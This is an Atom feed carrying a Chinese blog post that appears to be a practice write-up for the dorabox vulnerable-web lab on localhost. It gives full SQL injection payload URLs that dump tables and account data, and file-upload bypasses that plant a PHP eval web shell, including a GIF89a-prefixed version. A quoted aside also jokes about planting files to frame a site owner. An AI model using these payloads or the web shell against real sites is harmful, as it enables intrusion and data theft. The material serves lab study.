<?xml version="1.0"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>http://example.com</id>
    <title>Milkii0的秘密花园 • Posts by &#34;dorabox,靶场练习&#34; tag</title>
    <link href="http://example.com" />
    <updated>2020-10-15T08:40:33.000Z</updated>
    <category term="Java反序列化" />
    <category term="ysoserial调试" />
    <category term="文件上传靶场" />
    <category term="web,HTTP" />
    <category term="redis,未授权,漏洞利用" />
    <category term="前后端分离" />
    <category term="木马,汇总" />
    <category term="pikachu,web靶场" />
    <category term="webgoat" />
    <category term="dorabox,靶场练习" />
    <category term="sql注入靶场" />
    <entry>
        <id>http://example.com/2020/10/15/dmx/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/</id>
        <title>dorabox冒险手记</title>
        <link rel="alternate" href="http://example.com/2020/10/15/dmx/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/"/>
        <content type="html">&lt;h1 id=&#34;sqli字符型&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sqli字符型&#34;&gt;#&lt;/a&gt; SQLi 字符型&lt;/h1&gt;
&lt;h2 id=&#34;过程&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程&#34;&gt;#&lt;/a&gt; 过程：&lt;/h2&gt;
&lt;p&gt;字符型和数字型相比，就是要闭合单引号吧&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;单引号闭合，# 用 url 编码 %23：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;http://localhost/dorabox/sql_injection/sql_string.php ?title=1&#39; or 1=1 %23&#39; &amp;amp;submit=submit&lt;/code&gt; &lt;img src=&#34;dorabox_sqlchar002.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;下面就是和数字型注入相同的操作。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;利用 order by 或者 group by 判断字段数：&lt;/p&gt;
&lt;p&gt;正常： &lt;code&gt;http://localhost/dorabox/sql_injection/sql_string.php ?title=1&#39; or 1=1 order by 3 %23&#39; &amp;amp;submit=submit&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;报错： &lt;code&gt;http://localhost/dorabox/sql_injection/sql_string.php&lt;/code&gt; &lt;br&gt;
?title=1’ or 1=1 order by 4 %23’&lt;br&gt;
&amp;amp;submit=submit&lt;/p&gt;
&lt;p&gt;以上说明需要 3 个字段&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;爆该数据库所有表和 news 表有多少条数据&lt;/p&gt;
&lt;p&gt;&lt;code&gt;http://localhost/dorabox/sql_injection/sql_string.php ?title=1&#39; union select  1,(select table_rows from information_schema.tables where table_name=&#39;news&#39; and table_schema = database()),(select group_concat(table_name) from information_schema.tables where table_schema = database())  %23&#39; &amp;amp;submit=submit&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;因为没有 title 为’1’的文章，所以直接只会出后面攻击所得数据&lt;img src=&#34;dorabox_sqlchar003.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;注入的三个字段：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;1 并不会输出，所以随意&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;(select table_rows from information_schema.tables where table_name=‘news’ and table_schema = database ()) ，用于统计该表的数据数量，没什么用，就是想试试看&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;(select group_concat (table_name) from information_schema.tables where table_schema = database ())，利用 group_concat () 拼接字符串爆表名&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;爆字段&lt;/p&gt;
&lt;p&gt;&lt;code&gt;http://localhost/dorabox/sql_injection/sql_string.php ?title=1&#39; union  select 1, 2,group_concat(column_name) from information_schema.columns where table_name = &#39;account&#39; and table_schema = database() %23&#39; &amp;amp;submit=submit&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;dorabox_sqlchar004.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;爆内容&lt;/p&gt;
&lt;p&gt;&lt;code&gt;http://localhost/dorabox/sql_injection/sql_string.php ?title=1&#39; union  select 1, 2,concat_ws(&#39;-&#39;,id,rest,own) from account %23&#39; &amp;amp;submit=submit&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;dorabox_sqlchar005.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;总结&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结&#34;&gt;#&lt;/a&gt; 总结：&lt;/h2&gt;
&lt;p&gt;在 sql 注入中，注释常用’–+’，而注释符’#‘和’–&#39; 一般不能直接使用。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;‘#’：sql 手工注入时，浏览器地址栏输入的 &#39;＃&#39; 并没有发送到后台，因为 url 中 #号是用来指导浏览器动作的（例如锚点），对服务器端完全无用，# 的 url 编码是 %23，替换后可行&lt;/li&gt;
&lt;li&gt;‘–’：在字符型注入时，–和单引号连接在一起时，无法形成有效的 mysql 语句，可能造成单引号未闭合错误。所以可以使用–’，也可以尝试用多行注释符（块注释符 /**/）、一对英文括号、换行符或加号来代替空格&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;sqli搜索型&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sqli搜索型&#34;&gt;#&lt;/a&gt; SQLi 搜索型&lt;/h1&gt;
&lt;p&gt;类似字符型注入，主要就是闭合&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;dorabox_sqlss001.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;过程-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-2&#34;&gt;#&lt;/a&gt; 过程：&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;进行闭合&lt;/p&gt;
&lt;p&gt;‘&lt;a href=&#34;http://localhost/dorabox/sql_injection/sql_search.php&#34;&gt;http://localhost/dorabox/sql_injection/sql_search.php&lt;/a&gt;&lt;br&gt;
?content=’ or ‘%’=’&lt;br&gt;
&amp;amp;submit=submit’&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;dorabox_sqlss002.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;判断需要的字段数 3 个（感觉这种方法有点低级）&lt;/p&gt;
&lt;p&gt;&lt;code&gt;http://localhost/dorabox/sql_injection/sql_search.php ?content=&#39; union select 1,2,3 and &#39;%&#39;=&#39;  &amp;amp;submit=submit&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;dorabox_sqlss003.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;爆表，常规手段&lt;/p&gt;
&lt;p&gt;&lt;code&gt;SELECT * FROM news WHERE content like &#39;%$$$$$$&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() and &#39;%&#39;=&#39; %&#39;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;dorabox_sqlss004.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;爆字段&lt;/p&gt;
&lt;p&gt;&lt;code&gt;http://localhost/dorabox/sql_injection/sql_search.php ?content=$$$$$$&#39; union select 1,2, group_concat(column_name) from information_schema.columns where table_schema=database() and table_name = &#39;account&#39; and &#39;%&#39;=&#39; &amp;amp;submit=submit&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;dorabox_sqlss005.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;爆内容&lt;/p&gt;
&lt;p&gt;&lt;code&gt;http://localhost/dorabox/sql_injection/sql_search.php ?content=$$$$$$&#39; union select 1,2, concat_ws(&#39;--&#39;,id,rest,own) from account where &#39;%&#39;=&#39; &amp;amp;submit=submit&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;dorabox_sqlss006.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;总结-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-2&#34;&gt;#&lt;/a&gt; 总结：&lt;/h2&gt;
&lt;p&gt;sql 通配符&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&#34;text-align:left&#34;&gt;通配符&lt;/th&gt;
&lt;th style=&#34;text-align:left&#34;&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;%&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;替代 0 个或多个字符&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;_&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;替代一个字符&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;[&lt;em&gt;charlist&lt;/em&gt;]&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;字符列中的任何单一字符&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;[^&lt;em&gt;charlist&lt;/em&gt;] 或 [!&lt;em&gt;charlist&lt;/em&gt;]&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;不在字符列中的任何单一字符&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;js限制文件上传&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#js限制文件上传&#34;&gt;#&lt;/a&gt; JS 限制文件上传&lt;/h1&gt;
&lt;p&gt;前端进行了文件名后缀过滤&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;dorabox_fp_js003.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;过程-3&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-3&#34;&gt;#&lt;/a&gt; 过程：&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;打开源代码，把蓝色框部分内容删除，即绕过验证函数&lt;img src=&#34;dorabox_fp_js002.png&#34; alt=&#34;&#34;&gt;&lt;/li&gt;
&lt;li&gt;上传成功，路径告诉了，菜刀直连&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img src=&#34;dorabox_fp_js001.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;总结-3&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-3&#34;&gt;#&lt;/a&gt; 总结：&lt;/h2&gt;
&lt;p&gt;遇见了一个问题，还没有解决：&lt;/p&gt;
&lt;p&gt;为什么修改 js 代码，加上 |.php 不生效，而删除函数验证一改一个准？&lt;/p&gt;
&lt;p&gt;据说就是不可以改（小菜菜，要在前端控制台输入该函数，才会生效）&lt;/p&gt;
&lt;h1 id=&#34;任意文件上传&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#任意文件上传&#34;&gt;#&lt;/a&gt; 任意文件上传&lt;/h1&gt;
&lt;p&gt;随便传&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;dorabox_fp_all001.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;过程-4&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-4&#34;&gt;#&lt;/a&gt; 过程：&lt;/h2&gt;
&lt;p&gt;根据题目提示，获取到文件上传的路径，用菜刀直接连接&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;dorabox_fp_all002.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;上传的 php 一句话木马 attack.php：&lt;/p&gt;
&lt;p&gt;&lt;code&gt; &amp;lt;?php @eval($_POST[&#39;attack&#39;]) ?&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;总结-4&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-4&#34;&gt;#&lt;/a&gt; 总结：&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;php 一句话木马基本原理：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;@表示后面即使执行错误，也不报错 ($_POST [attack] 如果不加 @会报错，因为 attack 变量没有定义就被使用了，报错会暴露密码)&lt;/li&gt;
&lt;li&gt;eval () 函数，括号内的语句字符串什么的都当做代码执行&lt;/li&gt;
&lt;li&gt;$_POST [‘attack’] 表示以 post 的方式接收变量 attack，把变量 attack 里面的字符串当做 php 代码执行。例如，若接收到参数 attack=echo ‘attack’，此时代码变为 eval (“echo ‘attack’;”)，就会输出 attack&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;TruBW 博主举的常用的方法：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;你想查看目标硬盘里有没有小黄片，可以用 php 函数： &lt;code&gt;opendir()&lt;/code&gt;  和 &lt;code&gt;readdir()&lt;/code&gt;  等等。想上传点小黄片，诬陷站主，就用 php 函数： &lt;code&gt;move_uploaded_file&lt;/code&gt; ，当然相应的 html 要写好。你想执行 cmd 命令，则用 &lt;code&gt;exec()&lt;/code&gt; 。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;mime限制文件上传&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#mime限制文件上传&#34;&gt;#&lt;/a&gt; MIME 限制文件上传&lt;/h1&gt;
&lt;p&gt;.jpg 可以上传成功&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;dorabox_fp_mime001.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;过程-5&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-5&#34;&gt;#&lt;/a&gt; 过程：&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;打开网络抓包，把后缀修改为.php&lt;img src=&#34;dorabox_fp_mime002.png&#34; alt=&#34;&#34;&gt;&lt;/li&gt;
&lt;li&gt;上传成功，菜刀直连&lt;img src=&#34;dorabox_fp_mime003.png&#34; alt=&#34;&#34;&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;总结-5&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-5&#34;&gt;#&lt;/a&gt; 总结：&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;MIME 介绍：&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;MIME（Multipurpose Internet Mail Extensions）多用途互联网邮件扩展类型。是设定某种扩展名文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定的应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。（来自百度百科）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;常见的类型：&lt;/strong&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;文件类型&lt;/th&gt;
&lt;th&gt;后缀&lt;/th&gt;
&lt;th&gt;数据包中的文件类型&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;超文本标记语言文本&lt;/td&gt;
&lt;td&gt;.html&lt;/td&gt;
&lt;td&gt;text/html&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;xml 文档&lt;/td&gt;
&lt;td&gt;.xml&lt;/td&gt;
&lt;td&gt;text/xml&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;xhtml 文档&lt;/td&gt;
&lt;td&gt;.xhtml&lt;/td&gt;
&lt;td&gt;application/xhtml+xml&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;普通文本文档&lt;/td&gt;
&lt;td&gt;.text&lt;/td&gt;
&lt;td&gt;text/plain&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;RTF 文本&lt;/td&gt;
&lt;td&gt;.rtf&lt;/td&gt;
&lt;td&gt;application/rtf&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;PDF 文档&lt;/td&gt;
&lt;td&gt;.pdf&lt;/td&gt;
&lt;td&gt;application/pdf&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Miscrosoft Word 文件&lt;/td&gt;
&lt;td&gt;.word&lt;/td&gt;
&lt;td&gt;application/msword&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;PNG 图像&lt;/td&gt;
&lt;td&gt;.png&lt;/td&gt;
&lt;td&gt;image/png&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;GIF 图形&lt;/td&gt;
&lt;td&gt;.gif&lt;/td&gt;
&lt;td&gt;image/gif&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;JPEG 图形&lt;/td&gt;
&lt;td&gt;.jpeg,.jpg&lt;/td&gt;
&lt;td&gt;image/jpeg&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;au 声音文件&lt;/td&gt;
&lt;td&gt;.au&lt;/td&gt;
&lt;td&gt;audio/basic&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;MIDI 音乐文件&lt;/td&gt;
&lt;td&gt;mid,.midi&lt;/td&gt;
&lt;td&gt;audio/midi,audio/x-midi&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;RealAudio 音乐&lt;/td&gt;
&lt;td&gt;.ra,.ram&lt;/td&gt;
&lt;td&gt;audio/x-pn-realaudio&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;AVI 文件&lt;/td&gt;
&lt;td&gt;.avi&lt;/td&gt;
&lt;td&gt;video/x-msvideo&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;GZIP 文件&lt;/td&gt;
&lt;td&gt;.gz&lt;/td&gt;
&lt;td&gt;application/x-gzip&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;TAR 文件&lt;/td&gt;
&lt;td&gt;.tar&lt;/td&gt;
&lt;td&gt;application/x-tar&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;任意的二进制数据&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;application/octet-stream&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;&lt;strong&gt;出现在 HTTP 数据包中可能有的位置（不是很有画面感…）：&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;MIME 信息头有：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;MIME-Version:&lt;/p&gt;
&lt;p&gt;这个头提供了所用 MIME 的版本号。这个值习惯上为 1.0。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Content-Type:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;它定义了数据的类型，以便数据能被适当的处理。有效的类型有：text，image，audio，video，applications，multipart 和 message。注意任何一个二进制附件都应该被叫做 application/octet- stream。这个头的一些用例为：image/jpg, application/mswork，multipart/mixed，这只是很少的一部分。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Content-Transfer-Encoding:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这是所有头中最重要的一个，因为它说明了对数据所执行的编码方式，客户 / MUA 将用它对附件进行解码。对于每个附件，可以使用 7bit，8bit，binary ，quoted-printable，&lt;a href=&#34;https://baike.baidu.com/item/base64&#34;&gt;base64&lt;/a&gt; 和 custom 中的一种编码方式。7bit 编码是用在 US ASCII&lt;a href=&#34;https://baike.baidu.com/item/%E5%AD%97%E7%AC%A6%E9%9B%86&#34;&gt; 字符集&lt;/a&gt;上的常用的一种编码方式，也就是，保持它的原样。8bit 和 binary 编码一般不用。对人类可读的标准文本，如果传输要经过对格式有影响的&lt;a href=&#34;https://baike.baidu.com/item/%E7%BD%91%E5%85%B3&#34;&gt;网关&lt;/a&gt;时对其进行保护，可以使用 quoted printable 。Base64 是一种通用方法，在需要决定使用哪一种编码方法时，它提供了一个不用费脑子的选择；它通常用在二进制，非文本数据上。注意，任何非 7bit 数据必须用一种模式编码，这样它就可以通过 Internet&lt;a href=&#34;https://baike.baidu.com/item/%E9%82%AE%E4%BB%B6%E7%BD%91%E5%85%B3&#34;&gt; 邮件网关&lt;/a&gt;！&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Content-ID:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;如果 Content-Type 是 message/external-body 或 multipart/alternative 时，这个头就有用了，它超出了本文的范围。&lt;/p&gt;
&lt;h3 id=&#34;content-description&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#content-description&#34;&gt;#&lt;/a&gt; Content-Description:&lt;/h3&gt;
&lt;p&gt;这是一个可选的头。它是任何信息段内容的自由文本描述。描述必须使用 us-ascii 码。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Content-Disposition:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;一个试验性的头，它用于给客户程序 / MUA 提供提示，来决定是否在行内显示附件或作为单独的附件。&lt;/p&gt;
&lt;p&gt;MIME 段头（出现在实际的 MIME 附件部分的头），除了 MIME-Version 头，可以拥有以上任何头字段。如果一个 MIME 头是信息块的一部分，它将作用于整个信息体。例如，如果 Content-Transfer-Encoding 显示在信息（指整个信息）头中，它应用于整个信息体，但是如果它显示在一个 MIME 段里，它 &amp;quot;只能&amp;quot; 用于那个段中。&lt;/p&gt;
&lt;p&gt;注意：其可以对自动对收到的&lt;a href=&#34;https://baike.baidu.com/item/%E9%82%AE%E4%BB%B6&#34;&gt;邮件&lt;/a&gt;进行解密。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;[以上拓展来自这里&lt;/p&gt;
&lt;h1 id=&#34;拓展名限制文件上传&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#拓展名限制文件上传&#34;&gt;#&lt;/a&gt; 拓展名限制文件上传&lt;/h1&gt;
&lt;p&gt;后台进行了文件名后缀过滤，无法上传.php 文件&lt;/p&gt;
&lt;h2 id=&#34;过程-6&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-6&#34;&gt;#&lt;/a&gt; 过程：&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;尝试大小写绕过，把文件名后缀改为.phP，上传成功，菜刀直连&lt;img src=&#34;dorabox_fp_hz001.png&#34; alt=&#34;&#34;&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;总结-6&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-6&#34;&gt;#&lt;/a&gt; 总结：&lt;/h2&gt;
&lt;p&gt;因为写过 upload_labs (没写完)，就有思路&lt;/p&gt;
&lt;h1 id=&#34;内容限制文件上传&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#内容限制文件上传&#34;&gt;#&lt;/a&gt; 内容限制文件上传&lt;/h1&gt;
&lt;p&gt;对文件内容进行判读过滤&lt;/p&gt;
&lt;h2 id=&#34;过程-7&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-7&#34;&gt;#&lt;/a&gt; 过程：&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;在木马文件最前面加上 GIF89a:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;GIF89a &amp;lt;?php @eval($_POST[&#39;attack&#39;]) ?&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;上传成功，路径告诉了，菜刀直连&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img src=&#34;dorabox_fp_nr001.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;总结-7&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-7&#34;&gt;#&lt;/a&gt; 总结：&lt;/h2&gt;
&lt;p&gt;GIF89a 是文件头校验内容，服务器看到这里就会以为是 GIF 文件。&lt;/p&gt;
&lt;p&gt;常见的文件头对应关系（入职培训上的，这个我以前还找过，就是因为菜，没有找到）：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;JPEG;.JPE;.JPG，”JPGGraphic File”&lt;/li&gt;
&lt;li&gt;gif，”GIF 89A”&lt;/li&gt;
&lt;li&gt;zip，”Zip Compressed”&lt;/li&gt;
&lt;li&gt;doc;.xls;.xlt;.ppt;.apr，”MS Compound Document v1 or Lotus Approach APRfile”&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;sqli数字手工注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sqli数字手工注入&#34;&gt;#&lt;/a&gt; SQLi 数字手工注入&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;dorabox_sqlnum001.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;过程-8&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-8&#34;&gt;#&lt;/a&gt; 过程：&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;输出报错：&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://localhost/dorabox/sql_injection/sql_num.php?id=1&#34;&gt;http://localhost/dorabox/sql_injection/sql_num.php?id=1&lt;/a&gt; order by 4 &amp;amp;submit=submit&lt;img src=&#34;dorabox_sqlnum007.png&#34; alt=&#34;&#34;&gt; 正常输出：&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://localhost/dorabox/sql_injection/sql_num.php&#34;&gt;http://localhost/dorabox/sql_injection/sql_num.php&lt;/a&gt;&lt;br&gt;
?id=1 order by 3 &amp;amp;submit=submit&lt;/p&gt;
&lt;p&gt;以上说明，应输出 3 个字段&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;用 count (*) 统计表内数据，只有两条数据：&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://localhost/dorabox/sql_injection/sql_num.php?id=3&#34;&gt;http://localhost/dorabox/sql_injection/sql_num.php?id=3&lt;/a&gt; union select 10086,count(*),10087 from news order by 1 desc limit 1&lt;br&gt;
&amp;amp;submit=submit&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;dorabox_sqlnum002.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;爆数据库&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://localhost/dorabox/sql_injection/sql_num.php&#34;&gt;http://localhost/dorabox/sql_injection/sql_num.php&lt;/a&gt;&lt;br&gt;
?id=1 union select 3,database(),user() order by 1 desc limit 1&lt;br&gt;
&amp;amp;submit=submit&lt;img src=&#34;dorabox_sqlnum003.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;爆表名，利用 group_concat ()：&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://localhost/dorabox/sql_injection/sql_num.php?id=1&#34;&gt;http://localhost/dorabox/sql_injection/sql_num.php?id=1&lt;/a&gt; union select 3,group_concat(table_name),0 from information_schema.tables where table_schema = database() order by 1 desc&lt;br&gt;
&amp;amp;submit=submit&lt;img src=&#34;dorabox_sqlnum004.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;爆字段：&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://localhost/dorabox/sql_injection/sql_num.php&#34;&gt;http://localhost/dorabox/sql_injection/sql_num.php&lt;/a&gt;&lt;br&gt;
?id=1 union select 3,group_concat(column_name),0 from information_schema.columns where table_name = ‘account’ order by 1 desc&lt;br&gt;
&amp;amp;submit=submit&lt;img src=&#34;dorabox_sqlnum005.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;爆内容：&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://localhost/dorabox/sql_injection/sql_num.php&#34;&gt;http://localhost/dorabox/sql_injection/sql_num.php&lt;/a&gt;&lt;br&gt;
?id = 1 union select 3,concat_ws(&amp;quot;,&amp;quot;,id,rest,own),0 from account where 1=1 order by 1 desc&lt;img src=&#34;dorabox_sqlnum006.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
